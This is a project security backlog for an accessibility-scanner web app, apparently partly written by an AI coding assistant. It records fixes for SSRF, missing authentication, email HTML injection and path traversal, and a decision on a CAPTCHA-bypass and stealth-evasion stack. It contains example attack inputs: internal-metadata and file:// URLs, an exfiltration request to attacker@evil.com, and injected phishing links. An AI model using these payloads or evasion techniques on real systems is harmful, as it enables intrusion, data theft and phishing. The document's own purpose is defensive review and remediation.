# Backlog

Derived from the security review on 2026-09-16 (branch `main`, v0.6.1).
Ordered by priority. Each item is independently shippable.

Status key: `TODO` · `IN PROGRESS` · `DONE` · `WONTFIX`

---

## P0 — Block any public deploy until these are done

### SEC-1 — Validate scan target URLs (SSRF)
**Status:** DONE (2026-09-16) · **Where:** `lib/crawler.ts`, `app/api/crawl/route.ts:23-27`, `app/api/schedules/route.ts:31`

`new URL(targetUrl)` is a parser, not a security control. Verified to accept
`file:///etc/passwd`, `http://169.254.169.254/...`, `http://localhost:6379/`,
`http://[::1]:3000/`. The server-side browser then navigates there and raw page
HTML lands in the report via `lib/analyzer.ts:101`.

With `file://` the origin is the string `"null"`, so `isSameDomain`
(`lib/crawler.ts:6-12`) matches `"null" === "null"` and the crawler will walk
directory listings off the seed file.

**Acceptance criteria**
- [x] Shared `assertScannableUrl()` helper in `lib/url-guard.ts`; rejects any scheme but `http:`/`https:`
- [x] Hostname resolved via `dns.lookup` (honours /etc/hosts) and checked against RFC1918, loopback, link-local (169.254/16), CGNAT (100.64/10), and IPv6 equivalents
- [x] Re-checked **after redirects** in `crawler.ts`, not only on input
- [x] Enforced in `crawler.ts` **and** `scanner.ts` — the latter is independently reachable via `/api/scan/start`'s `selectedUrls`
- [x] `/api/crawl` and `/api/schedules` return 400 rather than 500
- [x] 32 tests cover every bypass string verified during the review
- [ ] Playwright request interceptor aborts off-allowlist hosts as defence in depth — *deferred, see note*

**Note:** the guard blocks navigation targets. Sub-resource requests made by a
scanned page (images, XHR) are not yet intercepted. Lower risk — their responses
never reach the report — but worth closing later.

### SEC-2 — Authentication on every API route
**Status:** TODO · **Where:** all 10 routes under `app/api/`, no `middleware.ts` exists

No route has any auth check. Combined with SEC-1 this is an unauthenticated
SSRF with a built-in exfiltration endpoint: crawl an internal host, then
`POST /api/scan/<id>/email {"to":"attacker@evil.com","format":"pdf+json"}`
delivers the contents out-of-band from your verified Resend domain.

**Acceptance criteria**
- [ ] `middleware.ts` protects `/api/*`
- [ ] `to` in the email route restricted to an operator-configured allowlist
- [ ] Decide and document the intended deployment model (see DEC-1)

---

## P1 — Fix before next release

### SEC-3 — Escape HTML in scheduled-report emails
**Status:** DONE (2026-09-16) · **Where:** `lib/scheduler.ts:29-33`

`schedule.name` and `schedule.config.targetUrl` are interpolated raw into email
HTML. Commit `a8a974a` added `escapeHtml` in `lib/report-email.ts:3-10` but
missed this second template — the CHANGELOG entry for 0.6.1 claims "all
user-controlled fields" were escaped, which is not currently true.

Attacker sets `name` to `<a href="https://evil/reset">Verify your account</a>`
and `notification.email` to a victim; the next cron fire sends attacker-authored
HTML from your SPF/DKIM-signed domain.

**Acceptance criteria**
- [x] `escapeHtml` exported from `lib/report-email.ts` and reused (not duplicated)
- [x] Applied to `schedule.name` and `schedule.config.targetUrl` in `buildEmailHtml`
- [x] Repo-wide grep confirms no third unescaped template — remaining interpolations are numeric counts from `computeSummary`
- [x] Tests assert `<script>` / `<a>` / `<img onerror>` in a schedule name and target URL come out escaped
- [x] CHANGELOG 0.6.1 entry corrected, `[Unreleased]` section added

### SEC-4 — Validate schedule updates (mass assignment)
**Status:** DONE (2026-09-16) · **Where:** `app/api/schedules/[id]/route.ts:16-30`, `lib/schedules.ts:46`

`PUT` accepts `Partial<Schedule>` and spreads it over the stored record. None of
`POST`'s checks (`cron.validate()`, `new URL()`, required fields) are repeated,
so a schedule can be created clean and then mutated to an internal `targetUrl`.
`registerSchedule` re-arms it, giving persistent SSRF that survives restarts via
`schedules.json`.

**Acceptance criteria**
- [x] `PUT` runs the same validation as `POST`, plus type checks POST lacked
- [x] Mutable fields whitelisted (`name`, `cronExpression`, `config`, `enabled`, `notification`) rather than spread — `id`, `createdAt`, `lastScanId` and friends are now server-owned
- [x] Tests: internal `targetUrl`, `file://`, invalid cron, and server-field overwrite all rejected

### DEP-1 — Upgrade Next.js off the critical advisory
**Status:** DONE (2026-09-16) · **Where:** `package.json:22`

`next` 16.1.6 is CRITICAL — HTTP request smuggling in rewrites. Fixed in 16.3.5.
`npm audit --omit=dev` reports 22 vulnerabilities total (1 critical, 11 high).

**Acceptance criteria**
- [x] Next.js on ^16.3.5 (was 16.1.6)
- [x] `npm audit` shows **zero vulnerabilities**, down from 22 (1 critical, 11 high)
- [x] Remaining highs were all non-breaking transitive fixes, applied via `npm audit fix`
- [x] `uuid` bumped 10 → ^11.1.1; only `v4()` with no `buf` argument is used, so the advisory never applied here, but the bump clears it with no API change
- [x] Verified after each step: 79 tests, `tsc --noEmit`, and `next build` all clean

### BUG-1 — `ANTROPHIC_API_KEY` typo silently disables AI analysis
**Status:** DONE (2026-09-16) · **Where:** `.env.local`, `lib/analyzer.ts:7`

The env var is misspelled. `new Anthropic()` reads `ANTHROPIC_API_KEY`, so every
scan falls through to `createFallbackIssues` and every report is flagged
`analysisFailed`. Not a security issue — a product-breaking one.

**Acceptance criteria**
- [x] Env var renamed to `ANTHROPIC_API_KEY` in `.env.local` (value preserved)
- [x] `lib/env-check.ts` warns at startup, and names the misspelling specifically if the old key is still present
- [x] `lib/analyzer.ts` logs why it fell back instead of swallowing the error in a bare `catch {}`
- [x] README gains an environment-variable table
- [ ] **Still needs doing by you:** set `ANTHROPIC_API_KEY` in Vercel via `vercel env add ANTHROPIC_API_KEY production` and remove the misspelled one — I can't touch your Vercel project

**Note:** the README already documented the correct spelling; only `.env.local`
was wrong. The fallback behaviour is kept deliberately — an axe-only report beats
no report — but it is no longer silent.

---

## P1 — Fix before next release (continued)

### DEC-1 — Decide the position on bot-detection evasion
**Status:** TODO · **Where:** `lib/turnstile.ts`, `lib/browser.ts`, `package.json:25-27`

**Raised from P2 on 2026-09-16.** The trigger was a cold sales email: *"I went
through jens-wedin/a11y-scanner and spotted puppeteer stealth. still building
that out?"* — from Isaac Bentoumi, "Commercial OPS @ anyIP"
(`isaac@anyipcore.com`). anyIP (anyip.io) is a residential and mobile proxy
provider, ~$2/GB, no strict KYC. Sent from a dedicated cold-outreach domain
registered 2025-03-17, separate from their primary `anyip.io`.

Their lead-scoring picked up `puppeteer-extra-plugin-stealth` in a public
`package.json` — the highest buying-intent signal in that market. Which means a
proxy vendor's targeting model read this repo and classified an accessibility
compliance tool as a bot-evasion operation. That classification is the problem,
independent of the sender.

The sender is not the point. The point is that the repo is **public**, the
evasion stack is the most legible thing in it from outside, and it is now
demonstrably being found by strangers. Studio Manfred sells accessibility
compliance; a public repo advertising Cloudflare challenge handling is a poor
artifact for a client or competitor doing diligence to land on.

The project ships a full
evasion stack: `puppeteer-extra-plugin-stealth` (~15 evasion modules),
`rebrowser-playwright` aliased over `playwright`, `alwaysIsolated` patch mode,
UA and `navigator.webdriver` spoofing, randomised human-like delays, a headful
retry on block, and `lib/turnstile.ts` which detects Cloudflare Turnstile, clicks
the checkbox and polls for the `cf_clearance` cookie.

That last piece is CAPTCHA bypass, not "anti-bot hardening". Pointed at
third-party sites it is a Cloudflare ToS violation and plausible CFAA / Computer
Misuse Act exposure in a commercial context. `lib/crawler.ts:175` also treats
*any* first-page failure as bot protection, so it escalates to evasion on an
ordinary timeout.

An a11y scanner has a legitimate path the evasion doesn't: scan with consent and
let the site owner allowlist the crawler.

**Options**
1. **Remove it** (recommended) — drop `lib/turnstile.ts`, the stealth plugin and
   `rebrowser-playwright`; use stock `playwright` with an honest UA
   (`A11yScanner/0.6 (+https://…/bot)`), respect `robots.txt`, document an
   allowlist step for clients. Also sheds 15 script-injecting transitive deps.
2. **Gate it** — keep it only behind verified proof of site ownership per scan.
3. **Keep as-is** — accept the legal and reputational exposure. Document that decision.

**Acceptance criteria**
- [ ] Decision made and recorded here with a date
- [ ] README's "Anti-bot hardening" section rewritten to match reality (see DOC-1)
- [ ] If (1): stealth deps removed, crawler works against a consenting test site

### DOC-1 — Stop advertising the evasion stack in public docs
**Status:** TODO · **Where:** `README.md:7`, `README.md:70`, `README.md:102`, `CHANGELOG.md:49`, `CHANGELOG.md:58`

`README.md:7` documents the whole stack in detail — `playwright-extra` with
"~10 evasion techniques", the `rebrowser-playwright` Runtime.Enable patch,
`alwaysIsolated` mode, the spoofed Chrome 131 UA, random navigation delays, and
that the first page waits on `networkidle` "so Cloudflare challenge pages can
complete". That paragraph is what turns a `package.json` grep hit into a
qualified lead, and what a client doing diligence would read.

Blocked on DEC-1 — if the stack is removed, this resolves itself. If it is kept,
the docs still shouldn't read as a capability pitch.

**Acceptance criteria**
- [ ] README describes what the scanner does, not how it avoids detection
- [ ] CHANGELOG entries kept honest but not promotional
- [ ] Consider making the repo private until DEC-1 is settled

---

## P2 — Hardening and infrastructure

### DEP-2 — Verify the Claude model id in the analyzer
**Status:** TODO · **Where:** `lib/analyzer.ts:137`

`analyzeViolations` requests `model: "claude-sonnet-4-6"`. The current Claude
generation is the 5 family (`claude-opus-5`, `claude-sonnet-5`) plus Haiku 4.5.
Worth confirming the id still resolves — with BUG-1 fixed the analyzer will now
log a clear error if it does not, so run one scan and read the console before
assuming it works.

**Acceptance criteria**
- [ ] One real scan run with `ANTHROPIC_API_KEY` set; console shows no `[analyzer]` fallback
- [ ] Model id updated if it no longer resolves, with the cost difference noted

### SEC-5 — Validate `scanId` route params
**Status:** DONE (2026-09-16) · **Where:** `lib/report.ts:23`

`path.join(REPORTS_DIR, \`${scanId}.json\`)` uses a route param. Next.js's
dynamic-segment matching plus the forced `.json` suffix make traversal hard to
reach, so this is hardening rather than a live vulnerability — but a UUID regex
closes the question for one line.

**Acceptance criteria**
- [x] `scanId` validated against a UUID regex before any filesystem access, on both read and write

**Note:** the RED test proved this was a *live* traversal at the library level —
`loadScanReport("../decoy-secret")` really did read a file outside `reports/`.
Next.js routing made it hard to reach through the HTTP layer, but the function
is now safe regardless of who calls it.

### OPS-1 — Replace the in-memory job queue for hosted use
**Status:** TODO · **Where:** `lib/queue.ts`, noted in `README.md:127`

Reports and schedules are written to the local filesystem (`reports/*.json`,
`schedules.json`), which does not persist on Vercel. `node-cron` in-process also
won't fire reliably on serverless. Blocks any multi-user deployment.

**Acceptance criteria**
- [ ] Storage decision made (Marketplace Postgres / Redis / Blob)
- [ ] `node-cron` replaced with Vercel Cron hitting a protected route
- [ ] Per CLAUDE.md: after deploy, confirm the protected route answers 401 not 500

---

## Notes

- Review scope: whole application, not a diff — the tree was clean with no branch delta.
- If the app only ever binds to localhost, SEC-1 and SEC-2 are largely self-inflicted.
  `CLAUDE.md` documents Vercel deploys and cron routes as active practice, so DEC-1
  should be settled before that happens.
